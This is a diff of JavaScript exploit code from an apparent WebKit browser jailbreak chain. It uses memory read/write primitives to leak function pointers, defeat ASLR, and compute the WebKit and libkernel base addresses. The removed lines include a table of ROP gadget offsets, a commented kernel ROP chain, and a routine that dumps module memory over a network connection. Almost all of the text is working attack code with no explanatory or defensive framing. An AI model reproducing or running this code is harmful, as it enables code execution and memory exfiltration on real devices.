@@ -1,53 +1,8 @@
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// CODE EXECUTION (STILL USERLAND) ///////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 var p;
-var ping = function(str) {
-    "use strict";
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", url, false);
-    xhr.send(null);
-}
-var findModuleBaseXHR = function(addr)
-{
-    var addr_ = addr.add32(0); // copy
-    addr_.low &= 0xFFFFF000;
-    ping("START: " + addr_);
-    
-    while (1) {
-        var vr = p.read4(addr_.add32(0x110-4));
-        ping("step" + addr_);
-        addr_.sub32inplace(0x1000);
-    }
-}
-var log = function(x) {
-    document.getElementById("console").innerText += x + "\n";
-}
-var print = function(string) { // like log but html
-    document.getElementById("console").innerHTML += string + "\n";
-}
 
-var dumpModuleXHR = function(moduleBase) {
-    var chunk = new ArrayBuffer(0x1000);
-    var chunk32 = new Uint32Array(chunk);
-    var chunk8 = new Uint8Array(chunk);
-    
-    connection.binaryType = "arraybuffer";
-    var helo = new Uint32Array(1);
-    helo[0] = 0x41414141;
-    
-    var moduleBase_ = moduleBase.add32(0);
-    connection.onmessage = function() {
-        try {
-            for (var i = 0; i < chunk32.length; i++)
-            {
-                var val = p.read4(moduleBase_);
-                chunk32[i] = val;
-                moduleBase_.add32inplace(4);
-            }
-            connection.send(chunk8);
-        } catch (e) {
-            print(e);
-        }
-    }
-}
 var deref_stub_jmp = function(addr) {
   var z = p.read4(addr) & 0xFFFF;
   var y = p.read4(addr.add32(2));
@@ -56,70 +11,27 @@ var deref_stub_jmp = function(addr) {
   
   return addr.add32(y + 6);
 }
-var geto2wk = function(o)
-    {
-        return webKitBase.add32(o);
-    }
-      /*
-      kchain.push(window.gadgets["pop rax"]);
-      kchain.push(savectx.add32(0x30));
-      kchain.push(window.gadgets["mov rax, [rax]"]);
-      kchain.push(window.gadgets["pop rcx"]);
-      kchain.push(kernel_slide);
-      kchain.push(window.gadgets["add rax, rcx"]);
-      kchain.push(window.gadgets["pop rdi"]);
-      kchain.push(savectx.add32(0x50));
-      kchain.push(window.gadgets["mov [rdi], rax"]);
-      */
-          gadgets = {    
-  "ret":                    geto2wk(0x3C),
-  "jmp rax":                geto2wk(0x82),
-  "ep":                     geto2wk(0xAD),
-  "pop rbp":                geto2wk(0xB6),
-  "mov [rdi], rax":         geto2wk(0x3FBA),
-  "pop r8":                 geto2wk(0xCC42),
-  "pop rax":                geto2wk(0xCC43),
-  "mov rax, rdi":           geto2wk(0xE84E),
-  "mov rax, [rax]":         geto2wk(0x130A3),
-  "mov rdi, rax; jmp rcx":  geto2wk(0x3447A), 
-  "pop rsi":                geto2wk(0x7B1EE),
-  "pop rdi":                geto2wk(0x7B23D),
-  "add rsi, rcx; jmp rsi":  geto2wk(0x1FA5D4),
-  "pop rcx":                geto2wk(0x271DE3),
-  "pop rsp":                geto2wk(0x27A450),
-  "mov [rdi], rsi":         geto2wk(0x39CF70),
-  "mov [rax], rsi":         geto2wk(0x2565a7),
-  "add rsi, rax; jmp rsi":  geto2wk(0x2e001),
-  "pop rdx":                geto2wk(0xdedc2),
-  "pop r9":                 geto2wk(0xbb30cf),
-  "add rax, rcx":           geto2wk(0x15172),
-  "jop":                    geto2wk(0xc37d0),
-  "infloop":                geto2wk (0x12C4009),
-
-        "memset": geto2wk(0x228),
-        "setjmp": geto2wk(0x14f8)
-    };  
-   
 ;var reenter_help = { length:
     { valueOf: function(){
         return 0;
     }
 }};
-
-var exploit = function() {
+var Exploit = function() {
   p=window.primitives;
-
+    print ("[+] exploit succeeded");
+    print("webkit exploit result: " + p.leakval(0x41414141));
+    print ("--- welcome to stage2 ---");
   p.leakfunc = function(func)
   {
     var fptr_store = p.leakval(func);
     return (p.read8(fptr_store.add32(0x18))).add32(0x40);
   }
 
-try {
+  try {
     // Leak address of parseFloat()
     var parseFloatStore = p.leakfunc(parseFloat);
     var parseFloatPtr = p.read8(parseFloatStore);
-
+    print("parseFloat at: 0x" + parseFloatPtr);
     // Defeat ASLR
     // Get webkit module address
     var webKitBase  = p.read8(parseFloatStore);
@@ -128,24 +40,22 @@ try {
     webKitBase.sub32inplace(0x5b7000-0x1C000);
 
     window.moduleBaseWebKit = webKitBase;
-
+    print("libwebkit base at: 0x" + webKitBase);
     
     var offsetToWebKit = function(off) {
       return window.moduleBaseWebKit.add32(off)
     }
 
     // Set gadgets to proper addresses
-    for(var gadget in geto2wk) {
-      geto2wk[gadgets] = offsetToWebKit(geto2wk[gadgets]);
+    for(var gadget in gadgets) {
+      gadgets[gadget] = offsetToWebKit(gadgets[gadget]);
     }   
-
-    var libKernelBase = p.read8(deref_stub_jmp(gadgets.stack_chk_fail));
-    window.libKernelBase = libKernelBase;
+    // Get libkernel module address
+    var libKernelBase  = p.read8(deref_stub_jmp(gadgets['stack_chk_fail']));
     libKernelBase.low &= 0xfffff000;
     libKernelBase.sub32inplace(0x12000);
-    
+
     window.moduleBaseLibKernel = libKernelBase;
-    
 
     var offsetToLibKernel = function(off) {
       return window.moduleBaseLibKernel.add32(off);
